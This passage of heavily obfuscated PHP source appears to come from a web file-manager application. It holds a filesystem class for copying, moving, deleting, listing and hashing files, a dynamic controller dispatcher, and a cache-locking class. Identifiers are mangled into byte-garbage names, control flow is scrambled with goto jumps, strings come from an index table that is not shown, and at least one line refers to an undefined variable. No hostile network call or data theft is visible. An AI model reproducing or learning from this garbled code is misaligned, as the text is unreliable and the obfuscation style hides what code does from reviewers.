$b‚âÇ¨ÍÙÒ); } return is_file($c¨Ò³ß Ùƒ) ? $this->getPathOuter($c¨Ò³ß Ùƒ) : !1; } public function mkdir($bëÅÌ—âéâ, $C”–œğâá’ = REPEAT_SKIP) { $bëÅÌ—âéâ = $this->iconvSystem($bëÅÌ—âéâ); if (is_dir($bëÅÌ—âéâ)) { return $this->getPathOuter($bëÅÌ—âéâ); } @mkdir($bëÅÌ—âéâ, 511, !0); return is_dir($bëÅÌ—âéâ) ? $this->getPathOuter($bëÅÌ—âéâ) : !1; } public function copyFile($CÜ¿‡°´Ô, $aÃ¦…˜‰ñï) { $this->mkdir($this->pathFather($aÃ¦…˜‰ñï)); $CÜ¿‡°´Ô = $this->iconvSystem($CÜ¿‡°´Ô); $aÃ¦…˜‰ñï = $this->iconvSystem($aÃ¦…˜‰ñï); $cè—áÉ¦§¤ = @copy($CÜ¿‡°´Ô, $aÃ¦…˜‰ñï); return $cè—áÉ¦§¤ ? $this->getPathOuter($aÃ¦…˜‰ñï) : !1; } public function moveFile($F˜Ÿöß„Ñ„, $dÆ»ª¥¡„Õ) { $this->mkdir($this->pathFather($dÆ»ª¥¡„Õ)); $F˜Ÿöß„Ñ„ = $this->iconvSystem($F˜Ÿöß„Ñ„); $dÆ»ª¥¡„Õ = $this->iconvSystem($dÆ»ª¥¡„Õ); $CËˆ„‹‹í = intval(@rename($F˜Ÿöß„Ñ„, $dÆ»ª¥¡„Õ)); if (!$CËˆ„‹‹í) { if ($CËˆ„‹‹í = intval(@copy($F˜Ÿöß„Ñ„, $dÆ»ª¥¡„Õ))) { @unlink($F˜Ÿöß„Ñ„); } } return $CËˆ„‹‹í ? $this->getPathOuter($dÆ»ª¥¡„Õ) : !1; } public function delFile($BØ«×åÅ¾¶) { $BØ«×åÅ¾¶ = $this->iconvSystem($BØ«×åÅ¾¶); if (!@unlink($BØ«×åÅ¾¶)) { @chmod($BØ«×åÅ¾¶, 511); if (!@unlink($BØ«×åÅ¾¶)) { return !1; } } else { return !0; } } public function delFolder($eá²õ¤¨à¼) { goto eáÃ‘‰ğ; Føª¶…ÎÎ: return rmdir($eá²õ¤¨à¼); goto Dƒ·¢ïŠ•š; eáÃ‘‰ğ: $F¡‡°¢¡Ş” =& $_SERVER[¬ˆÚÂ”Éğä]; $eá²õ¤¨à¼ = $this->iconvSystem($eá²õ¤¨à¼); if (!is_dir($eá²õ¤¨à¼)) { return !0; } goto A„øòŠåß£; A„øòŠåß£: if (!($dÅå³²—Ïà = opendir($eá²õ¤¨à¼))) { return !1; } while (($C½¨¤–‚¥ = readdir($dÅå³²—Ïà)) !== !1) { if ($C½¨¤–‚¥ == $F¡‡°¢¡Ş”[91] || $C½¨¤–‚¥ == $F¡‡°¢¡Ş”[1178]) { continue; } $A·‚„Šß­ = $eá²õ¤¨à¼ . $F¡‡°¢¡Ş”[8] . $C½¨¤–‚¥; if (is_file($A·‚„Šß­) || is_link($A·‚„Šß­)) { if (!unlink($A·‚„Šß­)) { chmod($A·‚„Šß­, 511); if (!unlink($A·‚„Šß­)) { return !1; } } } else { if (is_dir($A·‚„Šß­)) { chmod($A·‚„Šß­, 511); $A·‚„Šß­ = $this->iconvApp($A·‚„Šß­); if (!$this->delFolder($A·‚„Šß­)) { return !1; } } } } closedir($dÅå³²—Ïà); goto Føª¶…ÎÎ; Dƒ·¢ïŠ•š: } public function rename($BÄ¢©óÒÁ, $DŠ“¯‚½²ß) { goto a÷·ÓáŒàï; AÀà²óÙ: $F¤‰´ò©Úƒ = @rename($BÄ¢©óÒÁ, $A“ÇÃ·õ…‡); $A“ÇÃ·õ…‡ = $this->iconvApp($A“ÇÃ·õ…‡); return $F¤‰´ò©Úƒ ? $this->getPathOuter($A“ÇÃ·õ…‡) : !1; goto Bå‹ó–šíŞ; a÷·ÓáŒàï: $C©¢Ä‹°îé =& $_SERVER[¬ˆÚÂ”Éğä]; $f˜±‚¶“ŒŞ = $this->fileNameAuto($this->pathFather($BÄ¢©óÒÁ), $DŠ“¯‚½²ß); $f˜±‚¶“ŒŞ = $this->iconvSystem($f˜±‚¶“ŒŞ); goto Aøª²ÅÑÉ¥; Aøª²ÅÑÉ¥: $BÄ¢©óÒÁ = $this->iconvSystem($BÄ¢©óÒÁ); $BùÔ—É”ù¼ = $this->pathFather($BÄ¢©óÒÁ); $A“ÇÃ·õ…‡ = rtrim($BùÔ—É”ù¼, $C©¢Ä‹°îé[8]) . $C©¢Ä‹°îé[8] . $f˜±‚¶“ŒŞ; goto AÀà²óÙ; Bå‹ó–šíŞ: } public function size($bçéÄÍµ) { $bçéÄÍµ = $this->iconvSystem($bçéÄÍµ); return (double) abs(sprintf($_SERVER[¬ˆÚÂ”Éğä][1180], @filesize($bçéÄÍµ))); } public function info($d‚ë¢ƒ¶…) { $d‚ë¢ƒ¶… = $this->iconvSystem($d‚ë¢ƒ¶…); if ($this->isFolder($d‚ë¢ƒ¶…)) { return $this->folderInfo($d‚ë¢ƒ¶…); } else { if ($this->isFile($d‚ë¢ƒ¶…)) { return $this->fileInfo($d‚ë¢ƒ¶…); } } return !1; } protected function infoChildren($BµÀõ·³ÌË, &$bÁå‡ªÛ³—, $b•áÜÊÄë = true) { goto fË†¸³…†‰; fË†¸³…†‰: $f¿ˆßÃ·á„ =& $_SERVER[¬ˆÚÂ”Éğä]; check_abort(); $BµÀõ·³ÌË = rtrim($BµÀõ·³ÌË, $f¿ˆßÃ·á„[8]) . $f¿ˆßÃ·á„[8]; goto dĞ£‹óÇïÙ; EÜñùÍÏÂ£: closedir($D™á…Œ¼ëÏ); goto Cª´Æà‹í¬; dĞ£‹óÇïÙ: if ($b•áÜÊÄë) { $BµÀõ·³ÌË = $this->iconvSystem($BµÀõ·³ÌË); } if (!($D™á…Œ¼ëÏ = @opendir($BµÀõ·³ÌË))) { return; } while (($A”’Õ¿µ×Â = readdir($D™á…Œ¼ëÏ)) !== !1) { if ($A”’Õ¿µ×Â == $f¿ˆßÃ·á„[91] || $A”’Õ¿µ×Â == $f¿ˆßÃ·á„[1178]) { continue; } $BÇµ„‚¯…¦ = $BµÀõ·³ÌË . $A”’Õ¿µ×Â; if (is_file($BÇµ„‚¯…¦) || is_link($BÇµ„‚¯…¦)) { $bÁå‡ªÛ³—[$f¿ˆßÃ·á„[78]]++; $bÁå‡ªÛ³—[$f¿ˆßÃ·á„[77]] += (double) abs(sprintf($f¿ˆßÃ·á„[1180], @filesize($BÇµ„‚¯…¦))); } else { if (is_dir($BÇµ„‚¯…¦)) { $bÁå‡ªÛ³—[$f¿ˆßÃ·á„[79]]++; $this->infoChildren($BÇµ„‚¯…¦, $bÁå‡ªÛ³—, !1); } } } goto EÜñùÍÏÂ£; Cª´Æà‹í¬: } private function folderInfo($dö¸‘İË©Û, $b’ô½ã½“¨ = false) { $b¡ÚÅô¹¾É =& $_SERVER[¬ˆÚÂ”Éğä]; $dö¸‘İË©Û = rtrim($dö¸‘İË©Û, $b¡ÚÅô¹¾É[8]) . $b¡ÚÅô¹¾É[8]; $eŒñ‹âí = $this->iconvApp($this->pathThis($dö¸‘İË©Û)); if ($b’ô½ã½“¨) { return array($b¡ÚÅô¹¾É[28] => $eŒñ‹âí, $b¡ÚÅô¹¾É[75] => $this->getPathOuter($dö¸‘İË©Û), $b¡ÚÅô¹¾É[29] => $b¡ÚÅô¹¾É[76]); } $B»ÊÎóòÇ« = array($b¡ÚÅô¹¾É[28] => $eŒñ‹âí, $b¡ÚÅô¹¾É[75] => $this->getPathOuter($dö¸‘İË©Û), $b¡ÚÅô¹¾É[29] => $b¡ÚÅô¹¾É[76], $b¡ÚÅô¹¾É[187] => @filectime($dö¸‘İË©Û), $b¡ÚÅô¹¾É[107] => @filemtime($dö¸‘İË©Û), $b¡ÚÅô¹¾É[1181] => @fileatime($dö¸‘İË©Û), $b¡ÚÅô¹¾É[1175] => is_readable($dö¸‘İË©Û), $b¡ÚÅô¹¾É[1176] => is_writable($dö¸‘İË©Û), $b¡ÚÅô¹¾É[1182] => get_mode($dö¸‘İË©Û)); return $B»ÊÎóòÇ«; } private function fileInfo($F£·Â‚Šê, $b„ããä´œò = false) { $a­ªí³³Šï =& $_SERVER[¬ˆÚÂ”Éğä]; $DÑÎÄá®Š = $this->iconvApp($this->pathThis($F£·Â‚Šê)); if ($b„ããä´œò) { return array($a­ªí³³Šï[28] => $DÑÎÄá®Š, $a­ªí³³Šï[75] => $this->getPathOuter($F£·Â‚Šê), $a­ªí³³Šï[29] => $a­ªí³³Šï[167], $a­ªí³³Šï[77] => $this->size($F£·Â‚Šê), $a­ªí³³Šï[160] => $this->ext($DÑÎÄá®Š)); } $aà‰ïİâø = array($a­ªí³³Šï[28] => $DÑÎÄá®Š, $a­ªí³³Šï[75] => $this->getPathOuter($F£·Â‚Šê), $a­ªí³³Šï[29] => $a­ªí³³Šï[167], $a­ªí³³Šï[187] => @filectime($F£·Â‚Šê), $a­ªí³³Šï[107] => @filemtime($F£·Â‚Šê), $a­ªí³³Šï[1181] => @fileatime($F£·Â‚Šê), $a­ªí³³Šï[77] => $this->size($F£·Â‚Šê), $a­ªí³³Šï[160] => $this->ext($DÑÎÄá®Š), $a­ªí³³Šï[1175] => is_readable($F£·Â‚Šê), $a­ªí³³Šï[1176] => is_writable($F£·Â‚Šê), $a­ªí³³Šï[1182] => get_mode($F£·Â‚Šê)); return $aà‰ïİâø; } public function exist($c£µ™Âö”Ú) { $c£µ™Âö”Ú = $this->iconvSystem($c£µ™Âö”Ú); return @file_exists($c£µ™Âö”Ú); } public function isFile($cà¨£â×é¼) { $cà¨£â×é¼ = $this->iconvSystem($cà¨£â×é¼); return @is_file($cà¨£â×é¼); } public function isFolder($fòâŠµÇÌ) { $fòâŠµÇÌ = $this->iconvSystem($fòâŠµÇÌ); return @is_dir($fòâŠµÇÌ); } public function listPath($B¼Øå–ÑêË, $c‚…–éŠ¿ = false) { goto c´åŠ–ØËÈ; A°‘ºÎ°ƒÁ: closedir($f…¥ ‡Øƒ›); return $b„†Ô×íÆÍ; goto D—ÑéøæË±; AĞÅÅĞÄ¤©: $b„†Ô×íÆÍ = array($C Ã‡Ç·[74] => array(), $C Ã‡Ç·[73] => array()); if (!($f…¥ ‡Øƒ› = @opendir($B¼Øå–ÑêË))) { return $b„†Ô×íÆÍ; } while (($EŠˆäƒÀ» = readdir($f…¥ ‡Øƒ›)) !== !1) { if ($EŠˆäƒÀ» == $C Ã‡Ç·[91] || $EŠˆäƒÀ» == $C Ã‡Ç·[1178]) { continue; } $Fš¡øˆŒÄó = $B¼Øå–ÑêË . $EŠˆäƒÀ»; if (is_file($Fš¡øˆŒÄó)) { $b„†Ô×íÆÍ[$C Ã‡Ç·[73]][] = $this->fileInfo($Fš¡øˆŒÄó, $c‚…–éŠ¿); } else { $b„†Ô×íÆÍ[$C Ã‡Ç·[74]][] = $this->folderInfo($Fš¡øˆŒÄó, $c‚…–éŠ¿); } } goto A°‘ºÎ°ƒÁ; c´åŠ–ØËÈ: $C Ã‡Ç· =& $_SERVER[¬ˆÚÂ”Éğä]; $B¼Øå–ÑêË = $this->iconvSystem($B¼Øå–ÑêË); $B¼Øå–ÑêË = rtrim($B¼Øå–ÑêË, $C Ã‡Ç·[8]) . $C Ã‡Ç·[8]; goto AĞÅÅĞÄ¤©; D—ÑéøæË±: } public function listAll($c´«‚¬·¸Ş, &$A®¡÷„Šßä = array()) { goto fÏé£öÊ¸á; a›í†ï–Ù: return $A®¡÷„Šßä; goto C®²÷™§Ä; fÏé£öÊ¸á: $Eã°ŒèóÀğ =& $_SERVER[¬ˆÚÂ”Éğä]; $c´«‚¬·¸Ş = $this->iconvSystem($c´«‚¬·¸Ş); $c´«‚¬·¸Ş = rtrim($c´«‚¬·¸Ş, $Eã°ŒèóÀğ[8]) . $Eã°ŒèóÀğ[8]; goto BÓ›‘¬ÛÖ; BÓ›‘¬ÛÖ: if (!($B‰Ú¯îÔ¼º = @opendir($c´«‚¬·¸Ş))) { return $A®¡÷„Šßä; } while (($Eöµ´íôÏ = readdir($B‰Ú¯îÔ¼º)) !== !1) { if ($Eöµ´íôÏ == $Eã°ŒèóÀğ[91] || $Eöµ´íôÏ == $Eã°ŒèóÀğ[1178]) { continue; } $b™ÁáÈ¹ùè = $c´«‚¬·¸Ş . $Eöµ´íôÏ; if (is_dir($b™ÁáÈ¹ùè) && !is_link($b™ÁáÈ¹ùè)) { $A®¡÷„Šßä[] = array($Eã°ŒèóÀğ[75] => $b™ÁáÈ¹ùè . $Eã°ŒèóÀğ[8], $Eã°ŒèóÀğ[76] => 1, $Eã°ŒèóÀğ[107] => @filemtime($b™ÁáÈ¹ùè), $Eã°ŒèóÀğ[77] => 0); $this->listAll($b™ÁáÈ¹ùè, $A®¡÷„Šßä); } else { $A®¡÷„Šßä[] = array($Eã°ŒèóÀğ[75] => $b™ÁáÈ¹ùè, $Eã°ŒèóÀğ[76] => 0, $Eã°ŒèóÀğ[107] => @filemtime($b™ÁáÈ¹ùè), $Eã°ŒèóÀğ[77] => $this->size($b™ÁáÈ¹ùè)); } } closedir($B‰Ú¯îÔ¼º); goto a›í†ï–Ù; C®²÷™§Ä: } public function has($c»µ¢Ğƒ„, $Fã˜¢¿Ì = false, $E±ì¢ŞÏ¢¤ = true) { goto C—ôéÑƒÔĞ; C—ôéÑƒÔĞ: $Eè©›Í‹° =& $_SERVER[¬ˆÚÂ”Éğä]; $c»µ¢Ğƒ„ = $this->iconvSystem($c»µ¢Ğƒ„); $c»µ¢Ğƒ„ = rtrim($c»µ¢Ğƒ„, $Eè©›Í‹°[8]) . $Eè©›Í‹°[8]; goto A¸¤’ÈîÒâ; dì´ôÄÆŸ®: if ($Fã˜¢¿Ì) { return array($Eè©›Í‹°[191] => $a…¿¿Îøæ‡, $Eè©›Í‹°[192] => $a‹ÃôŒ›ê£); } return !1; goto AÄ¨©¶£•; CŞÜ³ÇÁ™: $EäÌ»é‚“ = 0; while (($Bµ†šÚ¢«‰ = readdir($E£Æ‰äŸª™)) !== !1) { if ($Bµ†šÚ¢«‰ == $Eè©›Í‹°[91] || $Bµ†šÚ¢«‰ == $Eè©›Í‹°[1178]) { continue; } $b²ì¹™Ê¢ê = $c»µ¢Ğƒ„ . $Bµ†šÚ¢«‰; if ($Fã˜¢¿Ì) { $EäÌ»é‚“++; if (@is_file($b²ì¹™Ê¢ê)) { $a…¿¿Îøæ‡++; } else { $a‹ÃôŒ›ê£++; } if ($EäÌ»é‚“ > 10000) { break; } continue; } if ($E±ì¢ŞÏ¢¤) { if (@is_file($b²ì¹™Ê¢ê)) { return !0; } } else { if (@is_dir($b²ì¹™Ê¢ê . $Eè©›Í‹°[8])) { return !0; } } } closedir($E£Æ‰äŸª™); goto dì´ôÄÆŸ®; A¸¤’ÈîÒâ: if (!($E£Æ‰äŸª™ = @opendir($c»µ¢Ğƒ„))) { return !1; } $a…¿¿Îøæ‡ = 0; $a‹ÃôŒ›ê£ = 0; goto CŞÜ³ÇÁ™; AÄ¨©¶£•: } public function hashSimple($bÄ¢ø¸­÷Ä) { goto B‘çíø›Ê; Fõ­—¹Ç’í: $bøÊÌÆÆä = fopen($bÄ¢ø¸­÷Ä, $CÙôğò‘[1183]); if (!$bøÊÌÆÆä) { return $fÙ¢Øø“ÎÑ; } for ($d××ˆ²ª±› = 0; $d××ˆ²ª±› < $DÅ î¹Ï±; $d××ˆ²ª±›++) { fseek($bøÊÌÆÆä, $d¯Ë´¢¹ * $d××ˆ²ª±›); $fÙ¢Øø“ÎÑ .= fread($bøÊÌÆÆä, $d°Àğ¯ïŒ³); } goto A‰¦â¼Ø£Ï; B‘çíø›Ê: $CÙôğò‘ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$bÄ¢ø¸­÷Ä) { return md5($CÙôğò‘[33]); } $bÄ¢ø¸­÷Ä = $this->iconvSystem($bÄ¢ø¸­÷Ä); goto eÌ¨•±ß; A‰¦â¼Ø£Ï: fseek($bøÊÌÆÆä, $dÌ©¡î¿â - $d°Àğ¯ïŒ³); $fÙ¢Øø“ÎÑ .= fread($bøÊÌÆÆä, $d°Àğ¯ïŒ³); fclose($bøÊÌÆÆä); goto f ïğŸ¥’°; e•°ƒÑ‡Ï»: if ($dÌ©¡î¿â <= $d°Àğ¯ïŒ³ * $DÅ î¹Ï±) { return $this->hashMd5($bÄ¢ø¸­÷Ä) . $dÌ©¡î¿â; } $fÙ¢Øø“ÎÑ = $CÙôğò‘[33]; $d¯Ë´¢¹ = intval($dÌ©¡î¿â / $DÅ î¹Ï±); goto Fõ­—¹Ç’í; f ïğŸ¥’°: return md5($fÙ¢Øø“ÎÑ) . $dÌ©¡î¿â; goto EÂ¿‘İç„; eÌ¨•±ß: $dÌ©¡î¿â = $this->size($bÄ¢ø¸­÷Ä); $d°Àğ¯ïŒ³ = 200; $DÅ î¹Ï± = 50; goto e•°ƒÑ‡Ï»; EÂ¿‘İç„: } public function getContent($Eó¥§ŞÍí) { $Eó¥§ŞÍí = $this->iconvSystem($Eó¥§ŞÍí); return file_get_contents($Eó¥§ŞÍí); } public function setContent($Dˆ‰“·èˆ, $fùŠ¿…¨®Ê = '') { $Dˆ‰“·èˆ = $this->iconvSystem($Dˆ‰“·èˆ); @file_put_contents($Dˆ‰“·èˆ, $fùŠ¿…¨®Ê, LOCK_EX); clearstatcache(); return strlen($fùŠ¿…¨®Ê) == filesize($Dˆ‰“·èˆ); } public function fileSubstr($cÛìˆ«±Õ, $d—×Ã™±â = 0, $E½â±­˜ƒ– = false) { goto fá§•î¥; D¯‘°ç«øÛ: if ($E½â±­˜ƒ– <= 0) { return $E £‡¥‡ªğ[33]; } $D½¾òò‚Å = fopen($cÛìˆ«±Õ, $E £‡¥‡ªğ[1183]); if (!$D½¾òò‚Å) { return !1; } goto E«ù²µñì; E«ù²µñì: fseek($D½¾òò‚Å, $d—×Ã™±â); $F’¼Äà³˜š = fread($D½¾òò‚Å, $E½â±­˜ƒ–); fclose($D½¾òò‚Å); goto Aåß¹‹è†; Aåß¹‹è†: return $F’¼Äà³˜š; goto B‹Ó½‚­; fá§•î¥: $E £‡¥‡ªğ =& $_SERVER[¬ˆÚÂ”Éğä]; $cÛìˆ«±Õ = $this->iconvSystem($cÛìˆ«±Õ); if ($E½â±­˜ƒ– === !1) { $E½â±­˜ƒ– = $this->size($cÛìˆ«±Õ); } goto D¯‘°ç«øÛ; B‹Ó½‚­: } public function upload($BçÅ›éŒ¡ã, $f‡‰óÂóëª, $fÏæÄ×‘·¢ = false, $E¶ÀŞ…ËåÊ = REPEAT_REPLACE) { $a“Ê±ñ¤Â’ = $this->copyFile($f‡‰óÂóëª, $BçÅ›éŒ¡ã); return $a“Ê±ñ¤Â’ ? $this->getPathOuter($BçÅ›éŒ¡ã) : !1; } public function setModifyTime($cã¡ºš®…·, $A¿ÍÛÆ‚¿ = '') { @touch($cã¡ºš®…·, intval($A¿ÍÛÆ‚¿)); } public function download($BŒç¶ºä¾«, $eº’»¨—²ì) { return $this->iconvSystem($BŒç¶ºä¾«); } } goto DØ¡‡µóâÌ; d’é¦Û‹²«: register_shutdown_function($_SERVER[í][32]); set_error_handler($_SERVER[í][46], $D‚ÜåŸã¼); if (function_exists($_SERVER[í][47])) { set_exception_handler($_SERVER[í][48]); } goto AÈÄ–Ä›çó; AÀ˜ ­‘…: define($_SERVER[¬ˆÚÂ”Éğä][1948], 1); define($_SERVER[¬ˆÚÂ”Éğä][1949], 2); define($_SERVER[¬ˆÚÂ”Éğä][1950], 3); goto fö›æÃ¬¥‘; a¾ÃÌ÷°Œ: function Action($C§ó‹°¸ÒÉ = '') { goto CÌá‘¹ëò½; C˜ÓŞŸä¿: $cò¹Ÿêê¼[$C‘ãÛó˜Ñ…] = new $cÃ¦‘ïğÁ(); $cò¹Ÿêê¼[$DÌ¢ÖÅÈõ] = $cò¹Ÿêê¼[$C‘ãÛó˜Ñ…]; return $cò¹Ÿêê¼[$C‘ãÛó˜Ñ…]; goto B…ôØ¢òò£; CÌá‘¹ëò½: $f²ì•¿‰¼ƒ =& $_SERVER[í]; static $cò¹Ÿêê¼ = array(); $DÌ¢ÖÅÈõ = $C§ó‹°¸ÒÉ; goto fĞŒÏœõ; fĞŒÏœõ: if (isset($cò¹Ÿêê¼[$DÌ¢ÖÅÈõ])) { return $cò¹Ÿêê¼[$DÌ¢ÖÅÈõ]; } $C§ó‹°¸ÒÉ = trim(str_replace($f²ì•¿‰¼ƒ[4], $f²ì•¿‰¼ƒ[5], $C§ó‹°¸ÒÉ), $f²ì•¿‰¼ƒ[4]); $cË‚È›óâ = explode($f²ì•¿‰¼ƒ[5], $C§ó‹°¸ÒÉ); goto a¨ÜñŠÊˆ™; a¨ÜñŠÊˆ™: $c®ÕÙ„¾éÁ = strtolower($cË‚È›óâ[0]); if (substr($c®ÕÙ„¾éÁ, -6) == $f²ì•¿‰¼ƒ[6]) { $C§ó‹°¸ÒÉ = substr($cË‚È›óâ[0], 0, -6); $cÃ¦‘ïğÁ = $C§ó‹°¸ÒÉ . $f²ì•¿‰¼ƒ[7]; $CÚ¨ÈÉ”¼£ = $f²ì•¿‰¼ƒ[8]; if (isset($cË‚È›óâ[1]) && substr(strtolower($cË‚È›óâ[1]), -5) == $f²ì•¿‰¼ƒ[9]) { $cÃ¦‘ïğÁ = $C§ó‹°¸ÒÉ . $cË‚È›óâ[1]; $CÚ¨ÈÉ”¼£ = $f²ì•¿‰¼ƒ[10] . $cË‚È›óâ[1] . $f²ì•¿‰¼ƒ[11]; } else { if (count($cË‚È›óâ) == 3) { $cÃ¦‘ïğÁ = $C§ó‹°¸ÒÉ . $cË‚È›óâ[1] . $cË‚È›óâ[2]; $CÚ¨ÈÉ”¼£ = $f²ì•¿‰¼ƒ[12] . $cË‚È›óâ[1] . $f²ì•¿‰¼ƒ[13] . $cË‚È›óâ[2] . $f²ì•¿‰¼ƒ[11]; } } $CÚ¨ÈÉ”¼£ = PLUGIN_DIR . $C§ó‹°¸ÒÉ . $f²ì•¿‰¼ƒ[4] . $CÚ¨ÈÉ”¼£; } else { if (substr($c®ÕÙ„¾éÁ, -5) == $f²ì•¿‰¼ƒ[9]) { $C§ó‹°¸ÒÉ = substr($cË‚È›óâ[0], 0, -5); return Model($C§ó‹°¸ÒÉ); } else { $cÃ¦‘ïğÁ = $cË‚È›óâ[0] . $cË‚È›óâ[1]; $CÚ¨ÈÉ”¼£ = CONTROLLER_DIR . $cË‚È›óâ[0] . $f²ì•¿‰¼ƒ[4] . $cË‚È›óâ[1] . $f²ì•¿‰¼ƒ[14]; } } $C‘ãÛó˜Ñ… = strtolower($cÃ¦‘ïğÁ); goto E’É’˜ò´õ; E’É’˜ò´õ: if (isset($cò¹Ÿêê¼[$C‘ãÛó˜Ñ…])) { return $cò¹Ÿêê¼[$C‘ãÛó˜Ñ…]; } if (is_file($CÚ¨ÈÉ”¼£)) { include_once $CÚ¨ÈÉ”¼£; } if (!class_exists($cÃ¦‘ïğÁ)) { return actionCallError("\133{$C§ó‹°¸ÒÉ}\x20\75\x3e\x20{$cÃ¦‘ïğÁ}\x5d\40\x63\x6c\x61\163\x73\40\x6e\x6f\x74\x20\145\170\151\x73\164\163\41"); } goto C˜ÓŞŸä¿; B…ôØ¢òò£: } function ActionApply($D¹š¶´Ì, $A–ğñäÉµö = array()) { goto eÁ¨‰š©«„; aÁÛî…Ú‚Õ: if (!method_exists($DèÊãöÕœ, $EÎ‡ñè—ğ´)) { return actionCallError("{$D¹š¶´Ì}\x20\155\x65\164\x68\157\x64\40\156\157\164\x20\x65\170\x69\163\164\163\x21"); } $DŞËÌ÷á¥§ = call_user_func_array(array($DèÊãöÕœ, $EÎ‡ñè—ğ´), $A–ğñäÉµö); return $DŞËÌ÷á¥§; goto aÔ¡¤¶›°ë; eÁ¨‰š©«„: if (is_array($D¹š¶´Ì)) { return call_user_func_array($D¹š¶´Ì, $A–ğñäÉµö); } if (function_exists($D¹š¶´Ì)) { return call_user_func_array($D¹š¶´Ì, $A–ğñäÉµö); } $f…ÁöÊïí÷ = strrpos($D¹š¶´Ì, $_SERVER[í][5]); goto Cë£ˆ‰éÖˆ; Cë£ˆ‰éÖˆ: $e»Ù¬¡¨Ì¦ = substr($D¹š¶´Ì, 0, $f…ÁöÊïí÷); $EÎ‡ñè—ğ´ = substr($D¹š¶´Ì, $f…ÁöÊïí÷ + 1); $DèÊãöÕœ = Action($e»Ù¬¡¨Ì¦); goto aÁÛî…Ú‚Õ; aÔ¡¤¶›°ë: } function actionCallError($BÛÃ‹÷ñá) { return write_log($BÛÃ‹÷ñá, $_SERVER[í][15]); } goto eÇĞç—‘Š–; FµæøÈ·–: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto C‰»¥„¶Õ·; fóª‡ˆ¤²: self::$timeout = $Bç† “Æ•ê[$f®÷ÖèØ‚á[775]] ? $Bç† “Æ•ê[$f®÷ÖèØ‚á[775]] : 10; $Aµ¥»‹°È = _get($GLOBALS[$f®÷ÖèØ‚á[6]], $f®÷ÖèØ‚á[776]); $e¢¡‹ÃÇ¥á = $Bç† “Æ•ê[$f®÷ÖèØ‚á[762]] ? $Bç† “Æ•ê[$f®÷ÖèØ‚á[762]] : $f®÷ÖèØ‚á[167]; goto C’³¦øñÏ×; C‰»¥„¶Õ·: $f®÷ÖèØ‚á =& $_SERVER[¬ˆÚÂ”Éğä]; if (self::$handle) { return self::$handle; } $Bç† “Æ•ê = $GLOBALS[$f®÷ÖèØ‚á[6]][$f®÷ÖèØ‚á[337]]; goto fóª‡ˆ¤²; C’³¦øñÏ×: if ($e¢¡‹ÃÇ¥á == $f®÷ÖèØ‚á[17] && $Aµ¥»‹°È == $f®÷ÖèØ‚á[9]) { $e¢¡‹ÃÇ¥á = $f®÷ÖèØ‚á[167]; } switch ($e¢¡‹ÃÇ¥á) { case $f®÷ÖèØ‚á[765]: self::$handle = new CacheLockRedis(); break; case $f®÷ÖèØ‚á[766]: self::$handle = new CacheLockMemcached(); break; case $f®÷ÖèØ‚á[17]: self::$handle = new CacheLockDatabase(); break; case $f®÷ÖèØ‚á[167]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto DÔˆÜ…½Ã“; DÔˆÜ…½Ã“: } private static function key($fŠö‡¿£») { return $_SERVER[¬ˆÚÂ”Éğä][777] . Cache::key($fŠö‡¿£»); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($eˆ¦›Œé = '') { self::$errorMsg = $eˆ¦›Œé; } public static function lockGlobal($c‚á¼·õæ, $cÖ‘îâõºÈ) { return self::lock($c‚á¼·õæ, $cÖ‘îâõºÈ, !0); } public static function lock($fÅë¦åîí, $E÷êí—ÒÃ = false, $aØŸí–¶§± = false) { goto dà¢•¡Ê; dà¢•¡Ê: $e›ë© ˜†³ =& $_SERVER[¬ˆÚÂ”Éğä]; $FÆÅˆñ—‚î = self::init(); $E¹ìµ½Šì = self::key($fÅë¦åîí); goto Bˆõ§ À¤; Bˆõ§ À¤: $E÷êí—ÒÃ = $E÷êí—ÒÃ ? $E÷êí—ÒÃ : self::$timeout; $aØô™äŞÅƒ = $FÆÅˆñ—‚î->lock($E¹ìµ½Šì, $E÷êí—ÒÃ); if (!$aØô™äŞÅƒ) { $Eù•¦á© = $e›ë© ˜†³[778] . $E÷êí—ÒÃ . $e›ë© ˜†³[67] . self::$errorMsg . $e›ë© ˜†³[67] . get_caller_msg(); $aÚô¸Ù×ìµ = "\x4c\157\x63\153\40\x61\143\x74\x69\157\x6e\72\x20{$E¹ìµ½Šì}\x20\164\x69\x6d\x65\157\165\164\54\157\x76\145\162\40{$E÷êí—ÒÃ}\x20\x73"; $aÚô¸Ù×ìµ = self::$errorMsg ? self::$errorMsg : $e¿‰¨ƒØÂë; write_log($Eù•¦á©, $e›ë© ˜†³[779]); show_json($aÚô¸Ù×ìµ, !1); } goto DÚô—öÌËµ; DÚô—öÌËµ: if (!$aØŸí–¶§±) { self::$lockItem[$E¹ìµ½Šì] = !0; } return $aØô™äŞÅƒ; goto dÉÎ´éãˆë; dÉÎ´éãˆë: } public static function lockGet($EÁ«­Î¦©) { $d»¼åÃ·È° = self::key($EÁ«­Î¦©); if (self::$lockItem[$d»¼åÃ·È°]) { return self::$lockItem[$d»¼åÃ·È°]; } return self::init()->lockGet($d»¼åÃ·È°); } public static function unlock($e¨†ëóéÔ©) { $e¡ÌöÖ¬õ = self::key($e¨†ëóéÔ©); self::$lockItem[$e¡ÌöÖ¬õ] = null; return self::init()->unlock($e¡ÌöÖ¬õ); } public static function unlockRuntime() { $ağœ¶¥àŒ =& $_SERVER[¬ˆÚÂ”Éğä]; $B›Õ½Ş = self::init(); $cÚŠİ™Ò—œ = !1; foreach (self::$lockItem as $C¶š­ÀĞ¤õ => $a—ÂùŠ”­Ğ) { if (!$a—ÂùŠ”­Ğ) { continue; } $B›Õ½Ş->unlock($C¶š­ÀĞ¤õ); if (!$cÚŠİ™Ò—œ) { $cÚŠİ™Ò—œ = !0; write_log($ağœ¶¥àŒ[780] . $C¶š­ÀĞ¤õ . $ağœ¶¥àŒ[67] . get_caller_msg(), $ağœ¶¥àŒ[779]); continue; } write_log($ağœ¶¥àŒ[780] . $C¶š­ÀĞ¤õ, $ağœ¶¥àŒ[779]); } } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $e†ÆŞ¸¹¯ =& $_SERVER[¬ˆÚÂ”Éğä]; $DîÑ·¤Á÷İ = $GLOBALS[$e†ÆŞ¸¹¯[6]][$e†ÆŞ¸¹¯[337]]; self::$cachePath = 